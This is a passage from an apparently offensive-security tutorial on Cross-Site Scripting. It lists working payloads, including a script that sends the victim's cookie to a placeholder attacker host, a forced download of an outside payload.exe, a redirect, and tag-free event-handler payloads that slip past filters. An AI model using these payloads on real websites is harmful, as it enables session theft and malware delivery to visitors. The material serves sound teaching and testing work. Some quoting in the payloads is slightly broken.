  md: "# Cross-Site Scripting XSS\n\nAt this point, we have all seen and dealt with\
    \ Cross-Site Scripting (XSS). Testing every variable on a website with the traditional\
    \ XSS attack: <script>alert(1)</script>, might be better for bounties, but can\
    \ we do more? What tools and methods can we use to utilize these attacks?\n\n\
    So, we all know that XSS attacks are client-side attacks that allow an attacker\
    \ to craft a specific request to inject malicious code into a response. This could\
    \ generally be fixed with proper input validation on the client and server-side,\
    \ but it is never easy. Why, you you ask? It is due to a multitude of reasons.\
    \ Everything from poor coding, to not understanding frameworks, and sometimes\
    \ applications just get too complex and it becomes hard to understand without\
    \ an input goes.\n\nBecause the alert boxes don't really harm, let's start with\
    \ some of the basic types of XSS attacks:\n\n+   * Cookie Stealing XSS: <script>document.write('<img\
    \ src=\"</Your IP/Stealer.php?cookie=%2B document.cookie%2B '/>');</script>\n\
    * Forcing the Download of a File: <script>var link = document.createElement('a');\
    \ link.href = \"http://the.earth.il/sgatatham/latest/x86/payload.exe'; link.download\
    \ = \"\"; document.body.appendChild(link); link.click();</script>\n* Redirecting\
    \ User: <script>window.location = \"https://www.youtube.com/watch?v=dQw4w9WgXcQ\"\
    ;</script>\n* Other Scripts to Enable Key Loggers, Take Pictures, and More\n \
    \ * http://www.owasp.org/payloads/list.html?c#category-capture\n\n# Obfuscated/Polyglot\
    \ XSS Payloads\n\nIn today's world, the standard XSS payload still works pretty\
    \ often, but we come across applications that block certain characters or WAFs\
    \ in front of the application. Two good resources to help you start crafting obfuscated\
    \ XSS payload attacks:\n\n+   * https://github.com/foospidy/payloads/tree/other/xss\n\
    * https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet\n\nSometimes\
    \ during an assessment, you might run into simple XSS filters for strings like\
    \ <script>. Obfuscating the XSS payload is one option, but it is also important\
    \ to note that not all JavaScript payloads require the open and close <script>\
    \ tags. There are some HTML Event Attributes that execute JavaScript when triggered\
    \ (https://www.w3schools.com/tags/ref_eventattributes.asp). This means any rule\
    \ that looks specifically for Script tags will be useless. For example, this HTML\
    \ Event Attributes that execute JavaScript despite being outside a <script> tag:\n\
    \n+   * <b onmouseover=alert('XSS')>Click Me!</b>\n* <svg onload=alert(1)>\n*\
    \ <body onload=\"alert('XSS')\\>"
  merge: -1
